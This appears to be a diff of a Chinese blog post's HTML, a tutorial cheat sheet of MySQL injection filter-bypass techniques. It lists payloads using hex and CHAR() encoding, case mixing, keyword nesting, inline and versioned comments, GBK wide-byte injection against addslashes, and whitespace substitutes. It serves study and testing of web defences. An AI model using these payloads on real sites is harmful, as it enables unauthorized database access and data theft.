@@ -112,19 +112,19 @@
 
 
 
-<meta name="description" content="绕过单引号   语句 解释     SELECT FROM Users WHERE username = 0x61646D696E HEX编码   SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110) CHAR()函数    大小写绕过?id=1+UnIoN+SeLecT+1,2,3-- 替换绕过?id=1+UNunionI">
+<meta name="description" content="绕过单引号   语句 解释     SELECT _FROM Users WHERE username = 0x61646D696E HEX编码   SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110) CHAR()函数    大小写绕过1?id=1+UnIoN+SeLecT`+1,2,3-- 替换绕过1?id=1+UNun">
 <meta name="keywords" content="Mysql">
 <meta property="og:type" content="article">
 <meta property="og:title" content="MySql注入-各种绕过姿势">
 <meta property="og:url" content="https://kidhat.github.io/2017/11/07/MySql注入-各种绕过姿势/index.html">
 <meta property="og:site_name" content="KidHat">
-<meta property="og:description" content="绕过单引号   语句 解释     SELECT FROM Users WHERE username = 0x61646D696E HEX编码   SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110) CHAR()函数    大小写绕过?id=1+UnIoN+SeLecT+1,2,3-- 替换绕过?id=1+UNunionI">
+<meta property="og:description" content="绕过单引号   语句 解释     SELECT _FROM Users WHERE username = 0x61646D696E HEX编码   SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110) CHAR()函数    大小写绕过1?id=1+UnIoN+SeLecT`+1,2,3-- 替换绕过1?id=1+UNun">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://kidhat.github.io/2017/11/07/MySql注入-各种绕过姿势/类型转换.png">
-<meta property="og:updated_time" content="2017-11-07T03:38:44.441Z">
+<meta property="og:updated_time" content="2017-11-07T04:33:56.673Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="MySql注入-各种绕过姿势">
-<meta name="twitter:description" content="绕过单引号   语句 解释     SELECT FROM Users WHERE username = 0x61646D696E HEX编码   SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110) CHAR()函数    大小写绕过?id=1+UnIoN+SeLecT+1,2,3-- 替换绕过?id=1+UNunionI">
+<meta name="twitter:description" content="绕过单引号   语句 解释     SELECT _FROM Users WHERE username = 0x61646D696E HEX编码   SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110) CHAR()函数    大小写绕过1?id=1+UnIoN+SeLecT`+1,2,3-- 替换绕过1?id=1+UNun">
 <meta name="twitter:image" content="https://kidhat.github.io/2017/11/07/MySql注入-各种绕过姿势/类型转换.png">
 
 
@@ -396,19 +396,19 @@
 </thead>
 <tbody>
 <tr>
-<td>SELECT <em>FROM Users WHERE username = 0x61646D696E</em></td>
+<td>SELECT _FROM Users WHERE username = <code>0x61646D696E</code></td>
 <td>HEX编码</td>
 </tr>
 <tr>
-<td>SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)</td>
+<td>SELECT FROM Users WHERE username = <code>CHAR(97, 100, 109, 105, 110)</code></td>
 <td>CHAR()函数</td>
 </tr>
 </tbody>
 </table>
-<h1 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h1><p><code>?id=1+UnIoN+SeLecT+1,2,3--</code></p>
-<h1 id="替换绕过"><a href="#替换绕过" class="headerlink" title="替换绕过"></a>替换绕过</h1><p><code>?id=1+UNunionION+SEselectLECT+1,2,3--</code></p>
-<h1 id="注释绕过"><a href="#注释绕过" class="headerlink" title="注释绕过"></a>注释绕过</h1><p><code>?id=1+un/**/ion+se/**/lect+1,2,3--</code></p>
-<h1 id="特殊嵌入绕过"><a href="#特殊嵌入绕过" class="headerlink" title="特殊嵌入绕过"></a>特殊嵌入绕过</h1><p><code>?id=1/*!UnIoN*/SeLecT+1,2,3--</code></p>
+<h1 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1+UnIoN+SeLecT`+1,2,3--</div></pre></td></tr></table></figure>
+<h1 id="替换绕过"><a href="#替换绕过" class="headerlink" title="替换绕过"></a>替换绕过</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1+UNunionION+SEselectLECT+1,2,3--</div></pre></td></tr></table></figure>
+<h1 id="注释绕过"><a href="#注释绕过" class="headerlink" title="注释绕过"></a>注释绕过</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1+un/**/ion+se/**/lect+1,2,3--</div></pre></td></tr></table></figure>
+<h1 id="特殊嵌入绕过"><a href="#特殊嵌入绕过" class="headerlink" title="特殊嵌入绕过"></a>特殊嵌入绕过</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1/*!UnIoN*/SeLecT+1,2,3--</div></pre></td></tr></table></figure>
 <h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>SQL注入中的宽字节国内最常使用的gbk编码，这种方式主要是绕过addslashes等对特殊字符进行转移的绕过。反斜杠()的十六进制为%5c，在你输入<code>%bf%27</code>时，函数遇到单引号自动转移加入\，此时变为%bf%5c%27，%bf%5c在gbk中变为一个宽字符”縗”。%bf那个位置可以是%81-%fe中间的任何字符。不止在sql注入中，宽字符注入在很多地方都可以应用。</p>
 <h1 id="MySQL版本号字符"><a href="#MySQL版本号字符" class="headerlink" title="MySQL版本号字符"></a>MySQL版本号字符</h1><p>Examples:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">UNION SELECT /*!50000 5,null;%00*//*!40000 4,null-- ,*//*!30000 3,null-- x*/0,null--+</div><div class="line">SELECT 1/*!41320UNION/*!/*!/*!00000SELECT/*!/*!USER/*!(/*!/*!/*!*/);</div></pre></td></tr></table></figure></p>
 <ul>
@@ -459,7 +459,7 @@
 </tbody>
 </table>
 <p>Example:</p><p></p>
-<p><code>&lt;p&gt;&#39;%0AUNION%0CSELECT%A0NULL%20%23</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;p&gt;&apos;%0AUNION%0CSELECT%A0NULL%20%23</div></pre></td></tr></table></figure>
 <h2 id="括号绕过空格"><a href="#括号绕过空格" class="headerlink" title="括号绕过空格"></a>括号绕过空格</h2><table>
 <thead>
 <tr>
@@ -479,8 +479,8 @@
 </tbody>
 </table>
 <p>Example:</p><p></p>
-<p><code>&lt;/p&gt;UNION(SELECT(column)FROM(table))</code></p>
-<h2 id="and-or后插入字符绕过空格"><a href="#and-or后插入字符绕过空格" class="headerlink" title="and/or后插入字符绕过空格"></a>and/or后插入字符绕过空格</h2><p>任意混合+ - ~ !可以达到绕过空格的效果（可以现在本地测试，混合后需要的奇偶数可能不同）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SELECTDISTINCT(db) FROM mysql.db WHERE`Host`=&quot;localhost&amp;amp&quot; and-++-1=1;需要偶数个--</div><div class="line">SELECTDISTINCT(db) FROM mysql.db WHERE`Host`=&quot;localhost&amp;amp&quot; and!! ~~~~!1=1;需要奇数个！</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;/p&gt;UNION(SELECT(column)FROM(table))</div></pre></td></tr></table></figure>
+<h2 id="and-or后插入字符绕过空格"><a href="#and-or后插入字符绕过空格" class="headerlink" title="and/or后插入字符绕过空格"></a>and/or后插入字符绕过空格</h2><p>任意混合+ - ~ !可以达到绕过空格的效果（可以现在本地测试，混合后需要的奇偶数可能不同）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SELECTDISTINCT(db) FROM mysql.db WHERE`Host`=&quot;localhost&quot; and-++-1=1;需要偶数个--</div><div class="line">SELECTDISTINCT(db) FROM mysql.db WHERE`Host`=&quot;localhost&quot; and!! ~~~~!1=1;需要奇数个！</div></pre></td></tr></table></figure></p>
 <p>其实一下的字符都可以测试</p>
 <table>
 <thead>
@@ -516,7 +516,7 @@
 </tr>
 </tbody>
 </table>
-<h2 id="注释符-amp-引号"><a href="#注释符-amp-引号" class="headerlink" title="注释符&amp;引号"></a>注释符&amp;引号</h2><p>SELECTDISTINCT(db) FROM mysql.db WHERE<code>Host</code>=”localhost” and/**/1=1;<br>SELECT DISTINCT(db) FROM mysql.db WHERE <code>Host</code>=&#39;localhost&#39; and&quot;1=1&quot;;</p>
+<h2 id="注释符-amp-引号"><a href="#注释符-amp-引号" class="headerlink" title="注释符&amp;引号"></a>注释符&amp;引号</h2><p>SELECTDISTINCT(db) FROM mysql.db WHERE Host=”localhost” and<code>/**/</code>1=1;<br>SELECT DISTINCT(db) FROM mysql.db WHERE Host=<code>&#39;localhost&#39;</code> and&quot;1=1&quot;;</p>
 <h1 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h1><table>
 <thead>
 <tr>
@@ -822,7 +822,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Mysql/" rel="tag"># Mysql</a>
+            <a href="/tags/Mysql/" rel="tag"><i class="fa fa-tag"></i> Mysql</a>
           
         </div>
       
